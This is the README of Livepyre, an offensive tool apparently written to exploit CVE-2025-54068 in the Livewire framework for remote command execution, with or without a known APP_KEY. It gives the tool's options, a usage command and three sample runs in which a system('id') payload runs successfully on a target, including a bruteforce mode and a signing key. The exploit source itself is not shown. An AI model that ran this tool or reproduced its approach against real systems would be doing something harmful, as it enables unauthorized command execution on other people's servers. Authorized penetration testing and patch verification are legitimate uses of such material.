# Livepyre

<p align="center">
    <img src="livepyre.png" alt="Logo" width="400px"/>
</p>

A tool designed to exploit CVE-2025-54068 and Remote Command Execution if the APP_KEY of the Livewire project is known.

Authors of the tool: `@_remsio_` `@_Worty`.

## Help

```bash
$ ./Livepyre.py -h
usage: Livepyre.py [-h] -u URL [-f FUNCTION] [-p PARAM] [-H HEADERS] [-P PROXY] [-a APP_KEY] [-d] [-F]
                   [-c]

Livewire exploit tool

options:
  -h, --help            show this help message and exit
  -u, --url URL         Target URL
  -f, --function FUNCTION
                        Function to execute (default: system)
  -p, --param PARAM     Param for function (default: id)
  -H, --headers HEADERS
                        Headers to add to the request (default None)
  -P, --proxy PROXY     Proxy URL for requests
  -a, --app-key APP_KEY
                        APP_KEY to sign snapshot
  -d, --debug           Enable debug output
  -F, --force           Force exploit even if version does not seems to be vulnerable
  -c, --check           Only check if the remote target is vulnerable (only revelant for the exploit
                        without the APP_KEY)
```

## Usage

```sh
$ ./Livepyre.py -u https://target.com/
```

## Examples

```sh
# Without the APP_KEY and if an object type is in snapshot
$ ./Livepyre.py -u http://livewire.local/counter
[INFO] The remote livewire version is v3.6.2, the target is vulnerable.
[INFO] Found snapshot(s). Running exploit.
[INFO] Running exploit without APP_KEY.
[INFO] Found 1 snapshot(s) available.
[INFO] Found 2 possible param(s).
[INFO] Checking for param(s) with object type to avoid bruteforce.
[INFO] test is typed as an object, triggering RCE.
[INFO] Sending payload system('id') to livewire.
[INFO] Payload works, output:
uid=1337(sail) gid=33(www-data) groups=33(www-data)

# Without the APP_KEY with bruteforce if there isn't any object type in snapshot
$ ./Livepyre.py -u http://livewire.local/counter
[INFO] The remote livewire version is v3.6.2, the target is vulnerable.
[INFO] Found snapshot(s). Running exploit.
[INFO] Running exploit without APP_KEY.
[INFO] Found 1 snapshot(s) available.
[INFO] Found 1 possible param(s).
[INFO] Checking for param(s) with object type to avoid bruteforce.
[WARNING] No param with direct object type was found, attempting bruteforce.
[INFO] Trying to gain RCE with param count.
[INFO] Sending payload system('id') to livewire.
[INFO] Payload works, output:
uid=1337(sail) gid=33(www-data) groups=33(www-data)

# With the APP_KEY
$ ./Livepyre.py -u http://livewire.local/counter -a 'base64:CGhMqYXFMzbOe048WS6a0iG8f6bBcTLVbP36bqqrvuA='
[INFO] The remote livewire version is v3.6.2, the target is vulnerable.
[INFO] Found snapshot(s). Running exploit.
[INFO] Running exploit with APP_KEY.
[INFO] Found 1 snapshot(s) available.
[INFO] Sending payload system('id') to livewire.
[INFO] Payload works, output:
uid=1337(sail) gid=33(www-data) groups=33(www-data)
```

# License

This project is licensed under the MIT License - see the LICENSE file for details.
